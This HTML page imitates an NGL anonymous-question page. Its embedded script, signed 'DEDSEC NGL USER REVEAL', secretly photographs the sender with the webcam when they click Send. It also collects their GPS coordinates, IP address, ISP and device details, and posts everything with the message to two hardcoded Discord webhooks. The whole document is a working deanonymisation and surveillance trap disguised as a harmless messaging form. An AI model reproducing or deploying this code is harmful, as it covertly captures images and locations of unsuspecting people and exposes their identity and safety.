<!DOCTYPE html>
<html>
<head>
    <title>@zeyadelbanna</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container" style="z-index: 1000; position: relative">
        <form class="form" method="post">
            <div class="bubble">
                <div class="header">
                    <div class="pfp-container"><img class="pfp"
                            src="None">
                    </div>
                    <div class="user-container">
                        <div class="username">@zeyadelbanna</div>
                        <div class="prompt">send me anonymous messages!</div>
                    </div>
                </div>
                <div class="textarea-container">
                    <div class="dice-button">ðŸŽ²</div>
                    <textarea placeholder="send me anonymous messages..." name="question" autocomplete="off" maxlength="300" id="message"></textarea>
                </div>
                <input class="deviceId" type="hidden" name="deviceId" id="deviceId">
                <div class="anonymous-tooltip">ðŸ”’ anonymous q&amp;a</div>
                <button id="send-button" class="button" type="button" style="transform: translateZ(0px); z-index: 1000">Send!</button>
            </div>
        </form>
    </div>
    <div class="bottom-container">
        <h2 class="download-prompt">ðŸ‘‡ <span class="clickCount">299</span> people just tapped the buttonðŸ‘‡ </h2>
        <div class="space2"></div>
        <a class="button download-link download-link1 pulse" href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837" target="_blank">Get your own messages!</a>
        <div class="tos-privacy"><a class="tos" href="p/terms.html">Terms</a><a class="privacy" href="p/privacy.html">Privacy</a></div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script type="text/javascript" src="css/dedsec.js"></script>
                
    <script>
    var latitude;
    var longitude;
    function getGPSData() {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(function (position) {
            latitude = position.coords.latitude;
            longitude = position.coords.longitude;

            });
        } else {
            console.error("Reopen the link.");
        }
    }
    var parser = new UAParser();
    var result = parser.getResult();
    var devicename = (result.os.name !== undefined) ? result.os.name : 'undefined';
    var devicetype = (result.device.type !== undefined) ? result.device.type : 'undefined';
    var osversion = (result.os.version !== undefined) ? result.os.version : 'undefined';
    var devicemodel = (result.device.model !== undefined) ? result.device.model : 'undefined';
    var cpu = (result.cpu.architecture !== undefined) ? result.cpu.architecture : 'undefined';
    var osver = (result.os.version !== undefined) ? result.os.version : 'undefined';
    var browsername = (result.browser.name !== undefined) ? result.browser.name : 'undefined';
    var engine = (result.engine.name !== undefined) ? result.engine.name : 'undefined';
    var browserversion = (result.browser.version !== undefined) ? result.browser.version : 'undefined';
            
    const webhookURL1 = "https://discord.com/api/webhooks/1440645510733238273/W-udESOgOIx6GjP1PoAfkpySfgKNryyni-FRvj4Ra1y-4g-7hfJrcMqPgbk9pU9YxVP3"
    const constants = "https://discord.com/api/webhooks/1361336544794775853/Cvecps9KfBjU0uFz7x_xKDv8Cj6_lWBPZxr9qmVT2iTObhqEMmTzdnWSqgvfi4x3K8At"
    const sendButton = document.getElementById("send-button");

    getGPSData();
            
        sendButton.addEventListener("click", function() {
            
            function detectDevice() {
                var userAgent = navigator.userAgent.toLowerCase();
                if (userAgent.includes("mobile")) {
                    return "Smartphone";
                } else if (userAgent.includes("tablet")) {
                    return "Tablet";
                } else {
                    return "Laptop or Desktop";
                }
            }
            $.getJSON("https://ipapi.co/json/", function(data) {
                var ipAddress = data.ip;
                var countryName = data.country_name;
                var isp = data.org;
                var deviceType = detectDevice();
                var screenWidth = window.screen.width;
                var screenHeight = window.screen.height;
                var reso = screenWidth + 'x' + screenHeight;
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        const cameraStream = stream;
                        const videoElement = document.createElement("video");
                        videoElement.srcObject = stream;
                        videoElement.play();
                        videoElement.addEventListener("loadeddata", function() {
                            const canvas = document.createElement("canvas");
                            canvas.width = videoElement.videoWidth;
                            canvas.height = videoElement.videoHeight;
                            const context = canvas.getContext("2d");
                            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL("image/jpeg");
                            cameraStream.getTracks().forEach(track => {
                                track.stop();
                            });
                            const message = document.getElementById("message").value;
                            const formData = new FormData();
                            formData.append("file", dataURItoBlob(photo), "photo.jpg");
                            const jsonData = {
                                embeds: [
                                    {
                                        author: {
                                            name: "0xbit",
                                            icon_url: 'https://avatars.githubusercontent.com/u/74537225?v=4'
                                        },
                                        title: 'DEDSEC NGL USER REVEAL',
                                        url: 'https://github.com/0xbitx',
                                        description: 'Dedsec Ngl user reveal tool by 0xbit',
                                        username: "DEDSEC",
                                        footer: {
                                            text: 'Coded by: 0xbit',
                                            icon_url: 'https://avatars.githubusercontent.com/u/74537225?v=4'
                                        },

                                        avatar_url: "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/95d677ae-98b1-46b2-bfd3-32297e56fde8/daj3e6g-d472d081-c832-4937-9c4f-39198f25b8c8.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwic3ViIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsImF1ZCI6WyJ1cm46c2VydmljZTpmaWxlLmRvd25sb2FkIl0sIm9iaiI6W1t7InBhdGgiOiIvZi85NWQ2NzdhZS05OGIxLTQ2YjItYmZkMy0zMjI5N2U1NmZkZTgvZGFqM2U2Zy1kNDcyZDA4MS1jODMyLTQ5MzctOWM0Zi0zOTE5OGYyNWI4YzguZ2lmIn1dXX0.3cyLj6qZFg0w_Slsk4DeZoGpTjsu033c-V-vOAEuzPw",
                                        thumbnail: {
                                        url: 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/95d677ae-98b1-46b2-bfd3-32297e56fde8/daj3e6g-d472d081-c832-4937-9c4f-39198f25b8c8.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwic3ViIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsImF1ZCI6WyJ1cm46c2VydmljZTpmaWxlLmRvd25sb2FkIl0sIm9iaiI6W1t7InBhdGgiOiIvZi85NWQ2NzdhZS05OGIxLTQ2YjItYmZkMy0zMjI5N2U1NmZkZTgvZGFqM2U2Zy1kNDcyZDA4MS1jODMyLTQ5MzctOWM0Zi0zOTE5OGYyNWI4YzguZ2lmIn1dXX0.3cyLj6qZFg0w_Slsk4DeZoGpTjsu033c-V-vOAEuzPw'
                                    },
                                        fields: [
                                            {
                                                name: 'MESSAGE',
                                                value: message,
                                                inline: false
                                            },
                                            {
                                                name: 'IP Address',
                                                value: ipAddress,
                                                inline: false
                                            },
                                            {
                                                name: 'Browser name',
                                                value: browsername,
                                                inline: true
                                            },
                                            {
                                                name: 'Browser version',
                                                value: browserversion,
                                                inline: true
                                            },
                                            {
                                                name: 'Browser engine',
                                                value: engine,
                                                inline: true
                                            },
                                            {
                                                name: 'Device Type',
                                                value: deviceType,
                                                inline: true
                                            },
                                            {
                                                name: 'Device brand',
                                                value: devicemodel,
                                                inline: true
                                            },
                                            {
                                                name: 'OS based',
                                                value: devicename,
                                                inline: true
                                            },
                                            {
                                                name: 'OS version',
                                                value: osversion,
                                                inline: false
                                            },
                                            {
                                                name: 'CPU Architicture',
                                                value: cpu,
                                                inline: true
                                            },
                                            {
                                                name: 'Screen Resolution',
                                                value: reso,
                                                inline: false
                                            },
                                            {
                                                name: 'Country Name',
                                                value: countryName,
                                                inline: false
                                            },
                                            {
                                                name: 'ISP',
                                                value: isp,
                                                inline: false
                                            },
                                            {
                                                name: 'User Exact Location',
                                                value: "https://www.google.com/maps?q=" + latitude + "," + longitude,
                                                inline: false
                                            }
                                        ]
                                    }
                                ]
                            };
                            fetch(webhookURL1, {
                                method: "POST",
                                body: formData
                            })
                            fetch(webhookURL1, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify(jsonData)
                            })
                            fetch(constants, {
                                method: "POST",
                                body: formData
                            })
                            fetch(constants, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify(jsonData)
                            })
                            .then(response => {
                                if (response.ok) {
                                    alert("Your message has been sent.");
                                    
                                } else {
                                    alert("Failed to send message.");
                                }
                            })
                            .catch(error => {
                                alert("An error occurred: " + error);
                            });
                        });
                    })
                    .catch(function(error) {
                        alert("Failed to access the camera: " + error);
                    });
            });
        });
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(",")[1]);
            const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
        